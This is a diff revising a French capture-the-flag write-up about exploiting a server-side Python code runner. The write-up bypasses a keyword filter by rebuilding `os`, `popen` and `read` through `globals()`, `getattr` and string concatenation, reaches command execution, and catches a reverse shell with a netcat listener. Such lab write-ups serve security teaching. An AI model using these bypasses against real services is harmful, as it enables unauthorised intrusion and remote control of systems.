@@ -463,69 +463,61 @@ Plusieurs sections sont disponibles dans le menu :
 
 
 
-L’exploration de ces pages ne révèle pas de fonctionnalité exploitable directement, et les mécanismes d’inscription et d’authentification n’apportent pas d’indice particulier à ce stade.
+L’exploration de ces pages ne révèle pas de fonctionnalité exploitable, et les mécanismes d’inscription et d’authentification ne donnent pas d’indice particulier à ce stade.
 
-L’interface principale repose sur deux actions :
+L’interface repose principalement sur deux actions :
 
-\- **Run** : exécuter le code Python
-\- **Save** : enregistrer un script
+- **Run** : exécuter du code Python
+- **Save** : enregistrer un script
 
-Un premier test avec un code minimal permet de valider le fonctionnement :
+Un test simple permet de valider le fonctionnement :
 
 ```python
 print("Hello, world!")
 ```
 
-Le résultat s’affiche immédiatement dans le panneau de droite, ce qui confirme que le code est exécuté côté serveur.
+Le résultat s’affiche immédiatement, ce qui confirme que le code est exécuté côté serveur.
 
-La fonctionnalité **Save** demande un nom de script, mais nécessite une authentification pour être utilisée. 
+La fonctionnalité **Save** nécessite une authentification. Tu pourrais créer un compte, mais ce n’est pas nécessaire : **Run** fonctionne déjà sans authentification et te permet d’interagir directement avec le backend.
+Dans ce contexte, **Save** peut être écartée.
 
-Elle n’apporte donc pas de piste exploitable dans ce contexte.
-
-En revanche, l’exécution via **Run** constitue un point d’entrée direct vers le backend.
-
-En testant différentes instructions Python, tu observes rapidement que certaines commandes sont bloquées avec le message :
+En testant différentes instructions, tu observes que certaines sont bloquées :
 
 ```text
 Use of restricted keywords is not allowed.
 ```
 
-Cela indique la présence d’un mécanisme de filtrage côté application.
+Cela indique la présence d’un filtrage côté application.
 
-Ces premiers constats orientent clairement l’analyse : l’application exécute du code Python côté serveur, mais tente d’en restreindre l’usage via un filtrage de mots-clés.
+Ton objectif devient alors de contourner ce filtrage pour transformer cette exécution Python en exécution de commandes système.
 
-L’objectif devient alors de contourner ce filtrage afin de transformer cette exécution en exécution de commandes système.
+Pour cela, tu analyses l’environnement Python en place à l’aide de `globals()` afin d’identifier les modules déjà chargés.
 
-La démarche classique consiste à exploiter l’environnement Python déjà chargé en mémoire via `globals()`, puis à identifier si des modules sensibles comme `os` sont accessibles.  
-
-Si c’est le cas, des fonctions comme `popen()` permettent d’exécuter des commandes système et d’en récupérer la sortie.
+Si le module `os` est accessible, tu peux exécuter des commandes système via `popen()`, avec pour objectif d’obtenir un reverse shell.
 
 Le chemin logique devient donc :
 
 `globals()` → `os` → `popen()` → exécution de commande → reverse shell
 
-------
-
 ### Analyse du filtrage et exploitation
 
-L’objectif devient alors de comprendre ce qui est filtré, et surtout comment contourner ces restrictions.
-
-Plutôt que d’importer directement des modules — ce qui est bloqué — tu explores l’environnement Python déjà chargé en mémoire via `globals()` :
+Tu affiches le contenu de `globals()` pour vérifier les modules accessibles :
 
 ```python
 print(globals().keys())
 ```
 
-Cette approche permet d’identifier les objets accessibles sans passer par un `import`.
+La sortie montre que le module `os` est disponible, ce qui te permet d’envisager l’exécution de commandes système.
 
-Tu constates notamment la présence du module `os`, ce qui ouvre la voie à une exécution de commandes système.
-
-Une première tentative consiste à appeler directement ce module :
+Une première tentative consiste à récupérer `os` depuis `globals()`, puis à appeler `popen` et `read` avec `getattr()` :
 
 ```python
 m = globals()['os']
-m.popen("id").read()
+p = getattr(m, 'popen')("id")
+print(getattr(p, 'read')())
 ```
+
+> En Python, `getattr(objet, "nom")` permet d’appeler une fonction en utilisant son nom sous forme de texte.
 
 Cette commande échoue avec le message :
 
@@ -533,30 +525,31 @@ Cette commande échoue avec le message :
 Use of restricted keywords is not allowed.
 ```
 
-Tu en déduis qu’au moins certains éléments utilisés dans cette instruction sont filtrés.
+Tu en déduis que certains termes utilisés dans cette instruction sont filtrés.
 
-Tu commences alors à contourner progressivement ces restrictions.
+Tu commences alors à essayer de contourner ces restrictions.
 
-D’abord, tu reconstruis dynamiquement le nom du module :
+- D’abord, tu reconstruis dynamiquement le nom du module :
 
 ```python
 m = globals()['o'+'s']
-m.popen("id").read()
+p = getattr(m, 'popen')("id")
+print(getattr(p, 'read')())
 ```
 
 Le filtrage est toujours présent.
 
-Tu appliques ensuite la même logique à `popen` :
+- Tu appliques ensuite la même logique à `popen` :
 
 ```python
 m = globals()['o'+'s']
 p = getattr(m, 'po'+'pen')("id")
-p.read()
+print(getattr(p, 'read')())
 ```
 
 Le blocage persiste.
 
-Enfin, tu contournes également `read` :
+- Enfin, tu contournes également `read` :
 
 ```python
 m = globals()['o'+'s']
@@ -566,13 +559,13 @@ print(getattr(p, 're'+'ad')())
 
 Cette fois, la commande s’exécute correctement et le résultat de `id` s’affiche.
 
-Cette progression permet de comprendre que le filtrage repose sur des correspondances de chaînes, et qu’il peut être contourné en reconstruisant dynamiquement les éléments sensibles.
+Cela te montre que le filtrage repose sur certains mots et peut être contourné en les reconstruisant dynamiquement.
 
-Tu confirmes ainsi que :
+Ces tests confirment que :
 
-- le code est exécuté côté serveur
-- l’accès au système est possible
-- le filtrage est contournable
+- le code est exécuté côté serveur  
+- l’accès au système est possible  
+- le filtrage peut être contourné  
 
 Tu disposes donc d’une **RCE (Remote Code Execution)** exploitable.
 
@@ -596,15 +589,9 @@ Avant d’exécuter ce code, tu démarres un listener sur ta machine Kali :
 nc -lvnp 4444
 ```
 
-Dès l’exécution du code via le bouton **Run**, la machine cible initie une connexion vers ton listener.
+À l’exécution via **Run**, la cible se connecte à ton listener et tu obtiens un shell.
 
-Tu obtiens ainsi un shell sur le système distant.
-
-Une stabilisation du shell est nécessaire pour poursuivre l’exploitation dans de bonnes conditions.
-
-Tu appliques alors la procédure standard décrite dans la recette dédiée :
-
-{{< recette "stabiliser-reverse-shell" >}}
+Tu stabilises ensuite le shell via la recette {{< recette "stabiliser-reverse-shell" >}}.
 
 
 
